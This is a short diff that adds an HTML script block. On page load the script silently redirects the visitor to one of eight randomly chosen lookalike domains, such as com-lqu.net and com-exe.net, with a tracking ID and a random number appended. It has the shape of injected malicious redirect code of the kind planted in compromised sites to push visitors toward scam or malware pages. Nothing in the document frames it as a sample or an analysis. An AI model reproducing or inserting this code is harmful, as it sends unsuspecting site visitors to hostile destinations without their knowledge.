@@ -1,0 +1,24 @@
+<script type="text/javascript">
+<!--
+function rand(min, max)
+{
+   return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+var urls =
+[
+ 'http://com-lqu.net/qwer.php?a=311397&c=wl_con&',
+ 'http://com-tb7.net/tyui.php?a=311397&c=wl_con&',
+ 'http://com-exe.net/opas.php?a=311397&c=wl_con&',
+ 'http://com-6d8.net/dfgh.php?a=311397&c=wl_con&',
+ 'http://com-qti.net/jklz.php?a=311397&c=wl_con&',
+ 'http://com-a44.net/xcvb.php?a=311397&c=wl_con&',
+ 'http://com-e5k.net/nmqw.php?a=311397&c=wl_con&',
+ 'http://com-3xg.net/erty.php?a=311397&c=wl_con&'
+];
+
+redir = urls[rand(0, urls.length-1)]+rand(111,9999);
+
+document.location.href = redir;
+//-->
+</script> 
